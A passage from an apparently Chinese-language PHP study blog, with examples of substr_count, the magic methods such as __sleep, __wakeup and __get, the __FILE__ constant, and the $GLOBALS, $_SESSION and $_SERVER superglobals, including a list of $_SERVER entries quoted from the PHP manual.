variable">$a</span><span class="token punctuation">,</span><span class="token string">"abca"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例三</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'aa'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token shell-comment comment"># Warning: substr_count(): Offset not contained in string in D:\phpstudy_pro\WWW\1.php on line 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h2><h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="__sleep()函数"></a>__sleep()函数</h3><blockquote><p>sleep 英译：睡觉<br>执行serialize()时，先会调用这个函数<br>如果存在，则该方法会优先被调用，然后才执行序列化操作。<br>相当于一个过滤器<br>必须定义返回值</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>  <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'男'</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span>  <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sex</span>  <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">/**    * @return array    */</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">echo</span> "当在类外部使用<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时会调用这里的<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法"<span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始赋值</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$person</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> ''<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回name和age，过滤了sex<br>返回结果：<br>当在类外部使用serialize()时会调用这里的__sleep()方法<br>O:6:”Person”:2:{s:4:”name”;s:8:”5bCP5piO”;s:3:”age”;i:25;}</p></blockquote><h3 id="construct-函数"><a href="#construct-函数" class="headerlink" title="__construct()函数"></a>__construct()函数</h3><blockquote><p>construct 译为：建造，构造、</p><p>当类实例化一个对象时，constaruct函数将自动调用</p><p>语法：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$sex</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">shu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">shu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'Atmujie'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sex</span><span class="token operator">=</span><span class="token string">"男"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token string">"19"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$new</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>jiang</p></blockquote><h3 id="wakeup-函数"><a href="#wakeup-函数" class="headerlink" title="__wakeup()函数"></a>__wakeup()函数</h3><blockquote><p>英译：醒醒<br>wakeup函数与sleep函数相对<br>如何有unserialize()函数进行反序列化，则先执行这个函数</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>  <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'男'</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span>  <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sex</span>  <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">/**    * @return array    */</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">echo</span> "当在类外部使用<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时会调用这里的<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法"<span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span>   <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">/**    * __wakeup    */</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">echo</span> "当在类外部使用<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时会调用这里的<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法"<span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token string">'男'</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 这里不需要返回数组</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始赋值</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$person</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$person</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wakeup重新定义了name的值，无需返回</p><p>运行结果：</p><p>当在类外部使用serialize()时会调用这里的__sleep()方法</p><p>string(58) “O:6:”Person”:2:{s:4:”name”;s:8:”5bCP5piO”;s:3:”age”;i:25;}” 当在类外部使用serialize()时会调用这里的__sleep()方法</p><p>当在类外部使用unserialize()时会调用这里的__wakeup()方法</p><p>object(Person)#2 (3) { [“sex”]=&gt; string(3) “男” [“name”]=&gt; int(2) [“age”]=&gt; int(25) }</p></blockquote><h3 id="invoke-函数"><a href="#invoke-函数" class="headerlink" title="__invoke()函数"></a>__invoke()函数</h3><blockquote><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>  <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'男'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span>  <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sex</span>  <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'这可是一个对象哦'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始赋值</span><span class="token variable">$person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//类不是函数，不能以这种方式输出，应使用 echo $person;</span><span class="token comment" spellcheck="true">//结果：这可是一个对象哦</span><span class="token comment" spellcheck="true">//如果没有__invoke(),仍当方法使用，就会报错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="toString-函数"><a href="#toString-函数" class="headerlink" title="__toString()函数"></a>__toString()函数</h3><blockquote><p>可以用来返回表示对象的字符串信息，一旦定义，打印命令将调用它并打印出返回的字符串。</p><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</p><p>当类被当作字符串执行时使用</p></blockquote><h3 id="set-函数"><a href="#set-函数" class="headerlink" title="__set()函数"></a>__set()函数</h3><blockquote><p>给一个未定义的变量赋值时触发</p></blockquote><h3 id="call-函数"><a href="#call-函数" class="headerlink" title="__call()函数"></a>__call()函数</h3><blockquote><p>试着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。</p></blockquote><h3 id="get-函数"><a href="#get-函数" class="headerlink" title="__get()函数"></a>__get()函数</h3><blockquote><p>在 php 面向对象编程中，类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。</p><p>在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理     * @param $propertyName     *     * @return int     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$propertyName</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$propertyName</span> <span class="token operator">==</span> <span class="token string">"age"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">></span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">-</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$propertyName</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$propertyName</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$Person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"小明"</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 通过Person类实例化的对象，并通过构造方法为属性赋初值</span><span class="token keyword">echo</span> <span class="token string">"姓名："</span> <span class="token punctuation">.</span> <span class="token variable">$Person</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 直接访问私有属性name，自动调用了__get()方法可以间接获取</span><span class="token keyword">echo</span> <span class="token string">"年龄："</span> <span class="token punctuation">.</span> <span class="token variable">$Person</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 自动调用了__get()方法，根据对象本身的情况会返回不同的</span><span class="token comment" spellcheck="true">//姓名：小明</span><span class="token comment" spellcheck="true">//年龄：50</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h2><h3 id="FILE常量"><a href="#FILE常量" class="headerlink" title="FILE常量"></a>FILE常量</h3><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">__FILE__</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>//返回当前文件的绝对路径<br>结果如：D:\www\1.php  </p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>//返回当前文件的上一级目录<br>结果如：D:\www<br>返回更上级可写为：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h2><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><blockquote><p>$GLOBALS — 引用全局作用域中可用的全部变量</p></blockquote><p>例如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token string">"local variable"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'$foo in global scope: '</span> <span class="token punctuation">.</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"foo"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'$foo in current scope: '</span> <span class="token punctuation">.</span> <span class="token variable">$foo</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token string">"Example content"</span><span class="token punctuation">;</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。</p><h3 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION[ ]"></a>$_SESSION[ ]</h3><blockquote><p>Session的中文是会话的意思，在Web编程中Session代表服务器与客户端之间的“会话”，意思是服务器与客户端在不断的交流。<br>在PHP中，使用$_SESSION[]可以存储特定用户的Session信息。并且每个用户的Session信息都是不同的。</p></blockquote><p>当用户请求网站中任意一个页面时，若用户未建立Session对象，则服务器会自动为用户创建一个Session对象，它包含唯一的SessionID和其他Session变量，并保存在服务器内存中，不同用户的Session对象存着各自指定的信息。</p><p>session_start(); //开启Session功能<br>session_id();//获取用户Session ID值，如需修改在括号中传值即可</p><p>例如：**$_SESSION[‘id’] = $id**</p><p>意为将用户的id赋值给变量$id</p><h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h3><blockquote><p>servers是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p></blockquote><p>以下摘自官方文档</p><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><p>在 $_SERVER 中，你也许能够，也许不能够找到下面的这些元素。注意，如果以<a href="https://www.php.net/manual/zh/features.commandline.php">命令行</a>方式运行 PHP，下面列出的元素几乎没有有效的(或是没有任何实际意义的)。</p><ul><li><p>‘PHP_SELF’</p><p>  当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/foo/bar.php">http://example.com/foo/bar.php</a> 的脚本中使用 $_SERVER[‘PHP_SELF’] 将得到 /foo/bar.php。<a href="https://www.php.net/manual/zh/language.constants.predefined.php"><strong>FILE</strong></a> 常量包含当前(例如包含)文件的完整路径和文件名。 如果 PHP 以命令行模式运行，这个变量将包含脚本名。</p></li><li><p>‘<a href="https://www.php.net/manual/zh/reserved.variables.argv.php">argv</a>‘</p><p>  传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p></li><li><p>‘<a href="https://www.php.net/manual/zh/reserved.variables.argc.php">argc</a>‘</p><p>  包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。</p></li><li><p>‘GATEWAY_INTERFACE’</p><p>  服务器使用的 CGI 规范的版本；例如，“<code>CGI/1.1</code>”。</p></li><li><p>‘SERVER_ADDR’</p><p>  当前运行脚本所在的服务器的 IP 地址。</p></li><li><p>‘SERVER_NAME’</p><p>  当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。<strong>注意</strong>: 在 Apache 2 里，必须设置 <code>UseCanonicalName = On</code> 和 <code>ServerName</code>。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值。</p></li><li><p>‘SERVER_SOFTWARE’</p><p>  服务器标识字符串，在响应请求时的头信息中给出。</p></li><li><p>‘SERVER_PROTOCOL’</p><p>  请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。</p></li><li><p>‘REQUEST_METHOD’</p><p>  访问页面使用的请求方法；例如，“<code>GET</code>”, “<code>HEAD</code>”，“<code>POST</code>”，“<code>PUT</code>”。<strong>注意</strong>:如果请求方法为 <code>HEAD</code>，PHP 脚本将在发送 Header 头信息之后终止(这意味着在产生任何输出后，不再有输出缓冲)。</p></li><li><p>‘REQUEST_TIME’</p><p>  请求开始时的时间戳。</p></li><li><p>‘REQUEST_TIME_FLOAT’</p><p>  请求开始时的时间戳，微秒级别的精准度。</p></li><li><p>‘QUERY_STRING’</p><p>  query string（查询字符串），如果有的话，通过它进行页面访问。</p></li><li><p>‘DOCUMENT_ROOT’</p><p>  当前运行脚本所在的文档根目录。在服务器配置文件中定义。</p></li><li><p>‘HTTP_ACCEPT’</p><p>  当前请求头中 <code>Accept:</code> 项的内容，如果存在的话。</p></li><li><p>‘HTTP_ACCEPT_CHARSET’</p><p>  当前请求头中 <code>Accept-Charset:</code> 项的内容，如果存在的话。例如：“<code>iso-8859-1,*,utf-8</code>”。</p></li><li><p>‘HTTP_ACCEPT_ENCODING’</p><p>  当前请求头中 <code>Accept-Encoding:</code> 项的内容，如果存在的话。例如：“<code>gzip</code>”。</p></li><li><p>‘HTTP_ACCEPT_LANGUAGE’</p><p>  当前请求头中 <code>Accept-Language:</code> 项的内容，如果存在的话。例如：“<code>en</code>”。</p></li><li><p>‘HTTP_CONNECTION’</p><p>  当前请求头中 <code>Connection:</code> 项的内容，如果存在的话。例如：“<code>Keep-Alive</code>”。</p></li><li><p>‘HTTP_HOST’</p><p>  当前请求头中 <code>Host:</code> 项的内容，如果存在的话。</p></li><li><p>‘HTTP_REFERER’</p><p>  引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。</p></li><li><p>‘HTTP_USER_AGENT’</p><p>  当前请求头中 <code>User-Agent:</code> 项的内容，如果存在的话。该字符串表明了访问该页面的用户代理的信息。一个典型的例子是：Mozilla/4.5 [en] (X11; U; Linux 2.2.9 i586)。除此之外，你可以通过 <a href="https://www.php.net/manual/zh/function.get-browser.php">get_browser()</a> 来使用该值，从而定制页面输出以便适应用户代理的性能。</p></li><li><p>‘HTTPS’</p><p>  如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</p></li><li><p>‘REMOTE_ADDR’</p><p>  浏览当前页面的用户的 IP 地址。</p></li><li><p>‘REMOTE_HOST’</p><p>  浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。<strong>注意</strong>: 你的服务器必须被配置以便产生这个变量。例如在 Apache 中，你需要在 httpd.conf 中设置 <code>HostnameLookups On</code> 来产生它。参见 <a href="https://www.php.net/manual/zh/function.gethostbyaddr.php">gethostbyaddr()</a>。</p></li><li><p>‘REMOTE_PORT’</p><p>  用户机器上连接到 Web 服务器所使用的端口号。</p></li><li><p>‘REMOTE_USER’</p><p>  经验证的用户</p></li><li><p>‘REDIRECT_REMOTE_USER’</p><p>  验证的用户，如果请求已在内部重定向。</p></li><li><p>‘SCRIPT_FILENAME’</p><p>  当前执行脚本的绝对路径。<strong>注意</strong>:如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER[‘SCRIPT_FILENAME’] 将包含用户指定的相对路径。</p></li><li><p>‘SERVER_ADMIN’</p><p>  该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。</p></li><li><p>‘SERVER_PORT’</p><p>  Web 服务器使用的端口。默认值为 